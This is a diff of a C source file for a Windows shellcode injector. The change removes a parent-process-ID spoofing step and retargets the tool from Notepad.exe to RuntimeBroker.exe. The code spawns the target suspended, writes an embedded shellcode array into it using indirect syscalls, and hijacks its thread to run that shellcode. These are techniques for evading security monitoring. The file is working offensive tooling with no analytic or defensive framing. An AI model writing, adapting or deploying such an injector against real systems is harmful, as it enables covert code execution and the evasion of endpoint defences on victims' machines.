@@ -1,24 +1,10 @@
 #include "Threading.h"
 
-#define TARGET_PROCESS		"Notepad.exe"
+#define TARGET		"RuntimeBroker.exe"
 
 
 int main(int argc, char* argv[])
 {
-
-
-	/*
-	
-		For this technique, although a notepad is created,
-		we will need to supply a PID to our target parent process
-		in order to perform a successful PPID Spoof.
-
-		Using the PID of svchost.exe that is owned by your user
-		should work perfectly fine.
-		
-	*/
-
-
 
 	UCHAR Shellcode[] = {
 	0xfc,0x48,0x83,0xe4,0xf0,
@@ -50,43 +36,21 @@ int main(int argc, char* argv[])
 
 
 
-
-	if (argc < 2)
-	{
-		WARN("Missing Parent Process PID! Required to perform PPID Spoofing!");
-		return -1;
-	}
-
-
-
-	DWORD ParentPID = atoi(argv[1]); // used for PPID
-	DWORD PID = NULL; // used for filling in the PID for other programs
-
-	HANDLE hProcess = NULL, hThread = NULL, hParent = NULL;
-
+	HANDLE hProcess = NULL;
+	HANDLE hThread = NULL;
+	DWORD dwProcessId = NULL;
+	DWORD dwThreadId = NULL;
+	SIZE_T shellsize = sizeof(Shellcode);
 	PVOID pAddress = NULL;
 
-
-
-	if ((hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ParentPID)) == NULL)
+	INFO("Creating Suspended process of: %s...", TARGET);
+	if (!CreateSuspendedProcess(TARGET, &dwProcessId, &hProcess, &hThread))
 	{
-		WARN("OpenProcess Failed! With an Error: %d", GetLastError());
-		return -1;
+		WARN("Failed to Create a Suspended Process! Reason: %lu", GetLastError());
+		return 1;
 	}
-	INFO("Spawning Target Process \"%s\" With Parent : %d", TARGET_PROCESS, ParentPID);
 
-
-
-	INFO("Creating Suspended Thread of: %s", TARGET_PROCESS);
-	if (!CreateSuspendedProcess(TARGET_PROCESS, &PID, hParent, &hProcess, &hThread))
-	{
-		WARN("CreateSuspendedProcess Function Failed! With an Error: %d", GetLastError());
-		return -1;
-	}
-	INFO("Target Process Created with PID: %d", PID);
-
-
-
+	OKAY("[0x%p] [%d] Process %s Created!", hProcess, dwProcessId, TARGET);
 
 	INFO("Performing Injection via Indirect Syscalls!");
 	if (!IndirectSyscallInjection(hProcess, Shellcode, sizeof(Shellcode), &pAddress))
@@ -100,8 +64,6 @@ int main(int argc, char* argv[])
 	INFO("Shellcode size: %zu bytes", sc_size);
 
 
-
-
 	INFO("Hijacking the Target Thread to run our Shellcode...");
 	if (!HijackThread(hThread, pAddress))
 	{
@@ -109,9 +71,7 @@ int main(int argc, char* argv[])
 		return -1;
 	}
 
-
-
-	OKAY("Successfully completed Thread Hijacking via Indirect Syscalls + PPID Spoofing!");
+	OKAY("Successfully completed Remote Thread Hijacking!");
 
 	CHAR("Cleanup!");
 	getchar();
@@ -126,12 +86,6 @@ int main(int argc, char* argv[])
 	{
 		INFO("[0x%p] Closing hThread...", hThread);
 		CloseHandle(hThread);
-	}
-
-	if (hParent)
-	{
-		INFO("[0x%p] Closing hParent...", hParent);
-		CloseHandle(hParent);
 	}
 
 	CHAR("Quit...");
